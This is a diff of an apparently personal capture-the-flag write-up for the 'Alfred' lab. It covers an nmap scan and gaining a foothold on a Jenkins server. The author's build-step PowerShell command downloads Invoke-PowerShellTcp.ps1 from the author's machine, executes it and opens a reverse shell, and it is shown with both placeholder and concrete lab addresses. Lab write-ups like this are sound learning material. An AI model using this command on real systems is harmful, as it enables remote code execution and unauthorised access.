@@ -11,15 +11,14 @@ Overview:
 
 First we need to scan for all open ports using nmap, but since the machine doesn't respond to ping (ICMP) we need to adjust the scan:
 
+```
 nmap  -Pn -A -p- 10.10.101.250 -T4
 
 -Pn   → Because the machine don't respond to ping
-
 -A    → Enable OS detection, version detection, script scanning, and traceroute
-
 -p-   → Scan all ports
-
 -T4   → To speed the scan (this loses some accuracy), otherwise it would take more time to complete.
+```
 
 ![Alfred_nmap_scan](https://user-images.githubusercontent.com/76821053/118020693-4ae2cd80-b352-11eb-8f5c-5e8250883d63.png)
 
@@ -29,11 +28,15 @@ The http at port 8080 hosted a jenkins server. We can try default credentials an
 
 We can created a new project inside Jenkins. At configurations we have a field called Build that let us do commands, so we can use the powershell command given by the room:
 
-**powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port**
+```
+powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+```
 
 In my case i used the below command, where i change the ip and port to match my machine.
 
-**powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.23.202:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.23.202 -Port 9001**
+```
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.23.202:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.23.202 -Port 9001
+```
 
 To breakdown this command we can tell that the first part of the command will download a file from a specific website or server, in this case from my kali machine and the 
 second part of the command tells the windows machine to execute it in order for us to get a reverse shell.
